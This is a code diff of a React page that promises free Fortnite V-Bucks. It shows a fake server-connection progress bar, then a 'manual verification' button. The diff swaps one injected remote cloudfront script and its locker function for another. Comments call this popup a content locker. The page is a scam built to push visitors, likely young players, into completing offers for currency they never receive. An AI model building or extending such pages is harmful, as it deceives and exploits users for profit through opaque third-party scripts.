@@ -18,24 +18,6 @@ const Verify = () => {
   const contentPathname = import.meta.env.VITE_CONTENT_PATHNAME;
 
   useEffect(() => {
-    // Adaugă scripturile necesare în <head>
-    const script1 = document.createElement("script");
-    script1.type = "text/javascript";
-    script1.innerHTML = 'var GuABJ_SXo_SmjyZc={"it":4460776,"key":"16c62"};';
-
-    const script2 = document.createElement("script");
-    script2.src = "https://d2v7l2267atlz5.cloudfront.net/c983e38.js";
-
-    document.head.appendChild(script1);
-    document.head.appendChild(script2);
-
-    return () => {
-      document.head.removeChild(script1);
-      document.head.removeChild(script2);
-    };
-  }, []);
-
-  useEffect(() => {
     const timer = setTimeout(() => {
       setIsLoading(false);
     }, 2000);
@@ -56,20 +38,28 @@ const Verify = () => {
     };
   }, []);
 
+  useEffect(() => {
+    const script1 = document.createElement("script");
+    script1.type = "text/javascript";
+    script1.innerHTML = 'var KbIBY_kgY_WGjRTc={"it":4459836,"key":"5f1f5"};';
+    document.head.appendChild(script1);
+
+    const script2 = document.createElement("script");
+    script2.src = "https://d2yc6hxtq0phup.cloudfront.net/655c2d0.js";
+    document.head.appendChild(script2);
+  }, []);
+
   const handleVerify = () => {
     toast({
       title: "Verification Required",
       description: "Please complete the human verification process.",
     });
-
-    // Deschide locker-ul dacă funcția _Cd() este definită
+    
     setTimeout(() => {
-      if (typeof (window as any)._Cd === "function") {
-        (window as any)._Cd();
-      } else {
-        console.error("Locker function (_Cd) not found.");
+      if (typeof window._uj === "function") {
+        window._uj();
       }
-    }, 5000); // Se deschide după 5 secunde
+    }, 5000);
   };
 
   return (
@@ -91,62 +81,33 @@ const Verify = () => {
 
       <div className="flex-1 container mx-auto py-8 px-4 flex flex-col items-center justify-center">
         {isLoading ? (
-          <motion.div
-            className="w-full max-w-md bg-black/40 backdrop-blur-sm rounded-xl p-8 border border-white/10 flex flex-col items-center"
-            initial={{ opacity: 0 }}
-            animate={{ opacity: 1 }}
-            transition={{ duration: 0.3 }}
-          >
+          <motion.div className="w-full max-w-md bg-black/40 backdrop-blur-sm rounded-xl p-8 border border-white/10 flex flex-col items-center">
             <Loader2 className="h-12 w-12 text-fortnite-blue animate-spin mb-4" />
             <h2 className="text-xl font-bold mb-2">Processing Request</h2>
-            <p className="text-center text-white/70 mb-6">
-              Please wait while we connect to the Fortnite servers...
-            </p>
+            <p className="text-center text-white/70 mb-6">Please wait while we connect to the Fortnite servers...</p>
             <div className="w-full bg-white/10 rounded-full h-2 mb-1">
-              <div
-                className="bg-fortnite-blue h-2 rounded-full transition-all duration-300"
-                style={{ width: `${progress}%` }}
-              ></div>
+              <div className="bg-fortnite-blue h-2 rounded-full transition-all duration-300" style={{ width: `${progress}%` }}></div>
             </div>
             <p className="text-sm text-white/50">{progress}% Complete</p>
           </motion.div>
         ) : (
-          <motion.div
-            className="w-full max-w-md bg-black/40 backdrop-blur-sm rounded-xl p-6 border border-white/10"
-            initial={{ opacity: 0, scale: 0.9 }}
-            animate={{ opacity: 1, scale: 1 }}
-            transition={{ duration: 0.3 }}
-          >
-            <motion.h2 className="text-2xl font-bold text-red-500 mb-1">
-              MANUAL VERIFICATION REQUIRED
-            </motion.h2>
-            <p className="text-white/80 text-center mb-6">
-              Hello <span className="text-fortnite-yellow font-semibold">@{username}</span>! You are almost done with synchronization of <span className="text-fortnite-yellow font-semibold">{vbucksAmount.toLocaleString()}</span> V-Bucks!
-            </p>
-            <Button
-              onClick={handleVerify}
-              className="w-full py-6 bg-fortnite-yellow hover:bg-fortnite-yellow/90 text-fortnite-black font-bold text-xl"
-            >
-              Manual Verify
-            </Button>
+          <motion.div className="w-full max-w-md bg-black/40 backdrop-blur-sm rounded-xl p-6 border border-white/10">
+            <div className="text-center mb-6">
+              <div className="flex justify-center items-center mb-3">
+                <Lock className="h-16 w-16 text-fortnite-blue p-3 bg-fortnite-black/70 rounded-full border-2 border-fortnite-blue" />
+              </div>
+              <h2 className="text-2xl font-bold text-red-500 mb-1">MANUAL VERIFICATION REQUIRED</h2>
+              <p className="text-white/80">Hello <span className="text-fortnite-yellow font-semibold">@{username}</span>! You are almost done with synchronization of <span className="text-fortnite-yellow font-semibold">{vbucksAmount.toLocaleString()}</span> V-Bucks!</p>
+            </div>
+            <motion.div className="text-center">
+              <Button onClick={handleVerify} className="w-full py-6 bg-fortnite-yellow hover:bg-fortnite-yellow/90 text-fortnite-black font-bold text-xl">
+                Manual Verify
+              </Button>
+            </motion.div>
           </motion.div>
         )}
       </div>
-
-      <footer className="py-4 border-t border-white/10">
-        <div className="container mx-auto px-4">
-          <p className="text-xs text-white/40 text-center">
-            All trademarks, service marks, trade names, trade dress, product
-            names and logos appearing on the site are the property of their
-            respective owners.
-          </p>
-        </div>
-      </footer>
-      <IframeModal
-        url={`/api/proxy/${contentPathname}`}
-        isOpen={isModalOpen}
-        onClose={() => setIsModalOpen(false)}
-      />
+      <IframeModal url={`/api/proxy/${contentPathname}`} isOpen={isModalOpen} onClose={() => setIsModalOpen(false)} />
     </div>
   );
 };
